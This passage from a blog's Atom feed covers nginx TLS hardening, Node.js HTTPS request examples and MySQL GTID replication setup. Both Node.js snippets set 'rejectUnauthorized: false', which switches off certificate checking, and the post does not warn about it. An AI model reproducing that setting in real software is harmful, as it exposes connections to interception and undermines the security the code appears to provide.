on;</div><div class="line">  </div><div class="line">  ssl_session_cache shared:SSL:50m;</div><div class="line"> </div><div class="line">  ssl_stapling on;</div><div class="line">  ssl_stapling_verify on;</div><div class="line">  resolver 8.8.4.4 8.8.8.8 valid=300s;</div><div class="line">  resolver_timeout 10s;</div><div class="line"> </div><div class="line">  </div><div class="line">  ssl_dhparam /etc/ssl/certs/dhparam.pem;</div><div class="line"> </div><div class="line">  add_header Strict-Transport-Security max-age=63072000;</div><div class="line">  add_header X-Frame-Options DENY;</div><div class="line">  add_header X-Content-Type-Options nosniff;</div><div class="line"> </div><div class="line">  root /var/www/;</div><div class="line">  index index.html index.htm;</div><div class="line">  server_name abc.org;</div><div class="line"> </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>解析：</p>
<p>ssl_dhparam /etc/ssl/certs/dhparam.pem; //nginx在DHE密钥交换的时候使用它<br>产生一个更强的DHE参数<br>cd /etc/ssl/certs<br>openssl dhparam -out dhparam.pem 4096</p>
<p>参考</p>
<p><a href="https://www.ssllabs.com/ssltest" target="_blank" rel="external">SSL 实验室测试(SSL Labs tes)</a> ,赶紧去测试吧<br><a href="https://cipherli.st/" target="_blank" rel="external">Strong Ciphers </a><br><a href="https://gist.github.com/gavinhungry/7a67174c18085f4a23eb" target="_blank" rel="external">Nginx SSL/TLS configuration for “A+” Qualys SSL Labs rating</a><br><a href="https://mozilla.github.io/server-side-tls/ssl-config-generator/" target="_blank" rel="external">Mozilla SSL Configuration Generator</a></p>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      how to strong Security on nginx
    
    </summary>
    
    
      <category term="nginx https ssl" scheme="https://t1ger.github.io/tags/nginx-https-ssl/"/>
    
  </entry>
  
  <entry>
    <title>how to send a https request in nodejs</title>
    <link href="https://t1ger.github.io/2016/09/27/how-to-send-a-https-request-in-nodejs/"/>
    <id>https://t1ger.github.io/2016/09/27/how-to-send-a-https-request-in-nodejs/</id>
    <published>2016-09-26T16:20:44.000Z</published>
    <updated>2016-09-26T15:53:23.250Z</updated>
    
    <content type="html"><![CDATA[<h4 id="Steps-to-send-a-https-request-to-a-rest-service-in-Node-js"><a href="#Steps-to-send-a-https-request-to-a-rest-service-in-Node-js" class="headerlink" title="Steps to send a https request to a rest service in Node js"></a>Steps to send a https request to a rest service in Node js</h4><ul>
<li>a)use request</li>
</ul>
<pre><code>var request = require(&apos;request&apos;);
var options = {
    url:&apos;https://abc.example.com.cn/In/index.php?m=Info&amp;a=Address&apos;,
    headers: {
        &apos;User-Agent&apos;: &apos;request&apos;
    },
    rejectUnauthorized: false
};
function callback(error, response, body) {
    if (!error &amp;&amp; response.statusCode == 200) {
        var info = JSON.parse(body);
        console.log(info);
    }else{
        console.log(error);
    }
}
request(options, callback);
</code></pre><ul>
<li>b)use https</li>
</ul>
<pre><code>var https = require(&apos;https&apos;);
        var options = {
            host: &apos;abc.example.com.cn&apos;,
            port: 443,
            path: &apos;/In/index.php?m=Info&amp;a=Address&apos;,
            method: &apos;GET&apos;,
            rejectUnauthorized: false
            };
        var req = https.request(options, function(res) {
        console.log(&apos;STATUS: &apos; + res.statusCode);
        console.log(&apos;HEADERS: &apos; + JSON.stringify(res.headers));
        res.setEncoding(&apos;utf8&apos;);
        res.on(&apos;data&apos;, function (chunk) {
        console.log(&apos;BODY: &apos; + chunk);
        });
        });
        req.on(&apos;error&apos;, function(e) {
        console.log(&apos;problem with request: &apos; + e.message);
        });
        // write data to request body
        req.write(&apos;data\n&apos;);
        req.write(&apos;data\n&apos;);
        req.end();    
</code></pre><hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      how to send a https request in nodejs
    
    </summary>
    
    
      <category term="nodejs https" scheme="https://t1ger.github.io/tags/nodejs-https/"/>
    
  </entry>
  
  <entry>
    <title>MySQL复制概述(二)</title>
    <link href="https://t1ger.github.io/2016/09/25/MySQL%E5%A4%8D%E5%88%B6%E6%A6%82%E8%BF%B0-%E4%BA%8C/"/>
    <id>https://t1ger.github.io/2016/09/25/MySQL复制概述-二/</id>
    <published>2016-09-25T08:28:12.000Z</published>
    <updated>2016-09-26T03:45:53.548Z</updated>
    
    <content type="html"><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><p>在上一文章中，我们了解了mysql5.5x系列的mysql复制，这篇文章我们主要介绍mysql5.7版本下的GTID主从复制</p>
<pre><code>什么是GTID
GTID = source_id:transaction_id
开启GTID的必备条件
gtid_mod=ON
enforce-gtid-consistency
log_bin=ON(可选)
log-slave-updates=ON(可选)
</code></pre><h6 id="a-标准安装步骤"><a href="#a-标准安装步骤" class="headerlink" title="a)标准安装步骤"></a>a)标准安装步骤</h6><ul>
<li>同步所有servers<pre><code>mysql&gt; set @@global.read_only = ON;
注： 执行前slave务必执行完所以更新
</code></pre></li>
<li>关闭所有servers<pre><code>shell&gt; mysqladmin -uusername -p shutdown
</code></pre></li>
<li><p>重启服务，并开启GTID</p>
<pre><code>shell&gt; mysqld --gtid-mode=ON --log-bin --enforce-gtid-consistency &amp;
</code></pre></li>
<li><p>执行同步命令</p>
<pre><code>mysql&gt; change master to
    master_host = host,
    master_port = port,
    master_user = user,
    master_password = password,
    master_auto_position = 1;
mysql&gt; start slave;
</code></pre></li>
<li><p>取消master的只读模式</p>
<pre><code>mysql&gt; set @@global.read_only = OFF;
</code></pre></li>
</ul>
<h6 id="b-从备份中恢复"><a href="#b-从备份中恢复" class="headerlink" title="b)从备份中恢复"></a>b)从备份中恢复</h6><ul>
<li><p>备份</p>
<pre><code>mysqldump --all-databases --single-transaction --trigger --routines --user=root -p &gt;backup.sql
# grep PURGED backup.sql
SET @@GLOBAL.GTID_PURGED=&apos;9a511b7b-7059-11e2-9a24-08002762b8af:1-13&apos;;
</code></pre></li>
<li><p>在slave上reset master ,导入备份<br>注：如果是逻辑导入，请设置sql_log_bin=off</p>
<pre><code>mysql&gt; reset master;
mysql&gt; show global variables like &apos;gtid_executed&apos;;
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| gtid_executed |       |
+---------------+-------+
mysql&gt; show global variables like &apos;gtid_purged&apos;;
+---------------+-------+
| Variable_name | Value |
+---------------+-------+
| gtid_purged   |       |
+---------------+-------+
mysql&gt; source backup.sql

mysql&gt; show global variables like &apos;gtid_executed&apos;;
+---------------+-------------------------------------------+
| Variable_name | Value                                     |
+---------------+-------------------------------------------+
| gtid_executed | 9a511b7b-7059-11e2-9a24-08002762b8af:1-13 |
+---------------+-------------------------------------------+
mysql&gt; show global variables like &apos;gtid_purged&apos;;
+---------------+-------------------------------------------+
| Variable_name | Value                                     |
+---------------+-------------------------------------------+
| gtid_purged   | 9a511b7b-7059-11e2-9a24-08002762b8af:1-13 |
+---------------+-------------------------------------------+
</code></pre></li>
<li><p>执行同步命令</p>
<pre><code>mysql&gt; change master to
    master_host = host,
    master_port = port,
    master_user = user,
    master_password = password,
    master_auto_position = 1;
mysql&gt; start slave;
</code></pre></li>
<li><p>主从复制常见错误<br> Slave_IO_Running: No<br> Slave_SQL_Running: Yes<br> Last_IO_Error: Got fatal error 1236 from master when reading data from binary log: ‘The slave is connecting using CHANGE MASTER TO MASTER_AUTO_POSITION = 1, but the master has purged binary logs containing GTIDs that the slave requires.’</p>
<p> 在master上查看GTID_EXECUTED</p>
<pre><code>mysql&gt; show global variables like &apos;GTID_EXECUTED&apos;;
+---------------+-------------------------------------------+
| Variable_name | Value                                     |
+---------------+-------------------------------------------+
| gtid_executed | 9a511b7b-7059-11e2-9a24-08002762b8af:1-14 |
+---------------+-------------------------------------------+
</code></pre><p>解决：</p>
<pre><code>mysql&gt;reset master;
mysql&gt;show global variables like &apos;GTID_EXECUTED&apos;;
    +---------------+-------+
    | Variable_name | Value |
    +---------------+-------+
    | gtid_executed |       |
    +---------------+-------+
mysql&gt; set global GTID_PURGED=&quot;9a511b7b-7059-11e2-9a24-08002762b8af:1-14&quot;;
mysql&gt; start slave io_thread;
mysql&gt; show slave status\G;
</code></pre></li>
</ul>
<ul>
<li>工具<br><a href="https://www.percona.com/software/mysql-database/percona-xtrabackup" target="_blank" rel="external">Percona XtraBackup</a></li>
</ul>
<hr>
<p>您的鼓励是我写作最大的动力</p>
<p>俗话说，投资效率是最好的投资。 如果您感觉我的文章质量不错，读后收获很大，预计能为您提高 10% 的工作效率，不妨小额捐助我一下，让我有动力继续写出更多好文章。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h5 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h5&gt;&lt;p&gt;在上一文章中，我们了解了mysql5.5x系列的mysql复制，这篇文章我们主要介绍mysql5.7版本下的GTID主从复制&lt;/p&gt;
&lt;pr
    
    </summary>
    
    
      <category term="mysql linux" scheme="https://t1ger.github.io/tags/mysql-linux/"/>
    
  </entry>
  
</feed>
